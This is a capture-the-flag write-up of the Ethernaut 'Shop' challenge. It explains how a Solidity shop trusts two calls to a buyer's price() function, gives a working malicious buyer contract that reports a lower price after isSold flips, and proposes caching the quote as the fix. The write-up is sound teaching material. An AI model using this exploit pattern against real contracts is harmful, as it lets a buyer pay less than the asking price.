# Ethernaut #21 — Shop

## Objective

Purchase the item for less than its advertised price.

The `Shop` contract exposes an item price and allows a buyer to purchase the item through `buy()`. The challenge is to make the purchase succeed while causing the shop to record a price lower than its original price.

## Vulnerability

The relevant logic in `Shop` is:

```solidity
function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
    }
}
```

The contract calls the buyer's `price()` function twice:

1. Before setting `isSold` to `true`.
2. After setting `isSold` to `true`.

However, it assumes that both calls will return the same price.

A malicious buyer contract can violate that assumption by returning a value that depends on the shop's current state.

## Exploit

### 1. Deploy a malicious buyer

My exploit contract uses the `isSold` state of the target `Shop` to determine the price it returns.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Buyer {
    uint256 x = 100;

    function attack(Shop shop) external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (Shop(msg.sender).isSold()) {
            return x / 100;
        } else {
            return x;
        }
    }
}
```

### 2. Understand the execution flow

Initially, `isSold` is `false` and the item's price is `100`.

When `attack()` calls `shop.buy()`, the execution proceeds as follows:

1. `Shop` calls `Buyer.price()`. Since `isSold` is `false`, the buyer returns `100`.
2. The shop checks that the returned price meets the advertised price.
3. The shop sets `isSold = true`.
4. The shop calls `Buyer.price()` again. This time, `isSold` is `true`, so the buyer returns `100 / 100 = 1`.
5. The shop records the new price as `1`.

The purchase succeeds, but the item's recorded price is reduced from `100` to `1`.

## Root Cause

The vulnerability is caused by **trusting an external contract to return consistent values across multiple calls**.

The shop calls an untrusted contract twice and assumes that the second result will match the first. However, external calls can return different values when the state they observe changes between calls.

This is an example of a state-dependent external call vulnerability.

## Key Takeaways

- A `view` function can return different values at different points in a transaction when the state it reads changes.
- `msg.sender` is the immediate caller. When `Shop` calls `Buyer.price()`, `msg.sender` inside `Buyer.price()` is the `Shop` contract.
- External contract calls should not be assumed to return consistent results.
- State changes between external calls can invalidate assumptions made earlier in the same function.
- The vulnerability can be exploited without modifying the target's code or directly changing its state from outside.

## Mitigation

The shop should avoid relying on repeated calls to an untrusted contract for a value that is expected to remain consistent.

A safer approach is to obtain the buyer's quoted price once, store it in a local variable, and use that same value for both validation and assignment.

For example:

```solidity
uint256 quotedPrice = _buyer.price();

if (quotedPrice >= price && !isSold) {
    isSold = true;
    price = quotedPrice;
}
```

This prevents the second call from returning a different value during the same execution. In a production system, the contract should also carefully define the intended pricing rules and validate any buyer-supplied values.

## Conclusion

Ethernaut #21 demonstrates how a contract can be exploited when it trusts repeated calls to an untrusted external contract to return the same value.

By checking the shop's `isSold` state, the malicious buyer returns the original price during validation and a lower price during assignment.

**Challenge #21 — Shop: Solved.**